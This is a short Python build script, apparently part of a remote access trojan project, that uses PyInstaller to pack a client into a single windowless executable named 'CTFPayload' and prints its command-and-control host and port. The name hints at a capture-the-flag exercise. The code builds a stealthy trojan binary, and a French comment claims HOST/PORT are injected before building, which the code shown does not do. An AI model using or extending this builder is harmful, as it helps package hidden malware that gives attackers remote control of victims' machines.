# rat/builder.py
# pip install pyinstaller
import subprocess, sys, os
from rat.config import HOST, PORT

def build():
    # injecte HOST/PORT dans le client avant de builder
    client_path = os.path.join(os.path.dirname(__file__), "client.py")
    out = "CTFPayload"
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--name", out,
        client_path
    ]
    subprocess.run(cmd, check=True)
    print(f"[+] dist/{out}.exe — C2 {HOST}:{PORT}")